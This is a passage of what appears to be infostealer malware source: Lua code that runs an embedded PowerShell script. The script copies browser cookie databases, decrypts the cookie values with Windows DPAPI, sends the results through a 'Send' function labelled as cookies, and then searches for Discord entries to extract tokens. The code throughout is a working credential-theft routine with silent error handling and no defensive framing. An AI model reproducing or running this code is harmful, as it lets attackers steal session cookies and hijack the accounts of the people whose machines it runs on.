            @{N="Vivaldi";P="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies"}
        )
        foreach($x in $b){
            if(Test-Path $x.P){
                try{
                    $db=$x.P+"._x"
                    Copy-Item $x.P $db -Force
                    $c=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
                    $c.Open()
                    $cm=$c.CreateCommand()
                    $cm.CommandText="SELECT host_key,name,encrypted_value FROM cookies"
                    $rd=$cm.ExecuteReader()
                    while($rd.Read()){
                        $h=$rd["host_key"];$n=$rd["name"];$v=$rd["encrypted_value"]
                        if($v -and $v.Length -gt 0){
                            try{
                                $b2=[System.Security.Cryptography.ProtectedData]::Unprotect($v,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $p=[System.Text.Encoding]::ASCII.GetString($b2)
                                if($p.Length -gt 5){$r+="$($x.N) | $h | $n | $p"}
                            }catch{}
                        }
                    }
                    $c.Close()
                    Remove-Item $db -Force -ErrorAction SilentlyContinue
                }catch{}
            }
        }
        $r -join "`n"
    ]]
    local r = RunPS(ps)
    if r and r ~= "" then
        Send(r, "🍪 Cookies")
        for line in r:gmatch("[^\n]+") do
            if line:find("discord") then
                local t = line:match("[^|]+$"):gsub("^%s+",""):gsub("%s+$","")
